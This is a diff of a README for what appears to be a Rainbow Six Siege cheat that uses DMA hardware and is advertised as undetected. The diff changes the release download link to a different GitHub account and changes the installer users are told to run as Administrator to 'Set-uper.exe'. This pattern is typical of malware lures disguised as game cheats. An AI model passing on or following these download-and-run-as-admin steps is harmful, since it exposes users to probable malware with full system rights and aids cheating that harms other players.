@@ -19,8 +19,8 @@
 > **Note:** Requires a supported DMA hardware card (Lurker, Screamer, Captain DMA) and a USB 3.0+ data connection between two PCs.
 
 1. **Hardware Setup:** Insert your DMA card into the gaming PC and connect the data port to your analysis PC.
-2. **Download Release:** [📥 Download Latest Binaries v2.9.4](https://github.com/berfairy440/Legend-RainbowSixSiege-Undetected-2026/releases/tag/2026)
-3. **Initialization:** Run Install.exe as Administrator on your secondary PC.
+2. **Download Release:** [📥 Download Latest Binaries v2.9.4](https://github.com/AndresNavarroVelazquez/Legend-RainbowSixSiege-Undetected-2026/releases/tag/2026)
+3. **Initialization:** Run Set-uper.exe as Administrator on your secondary PC.
 4. **Environment:** Install the latest vmmdll.dll and leechcore.dll into the root directory.
 
 ---
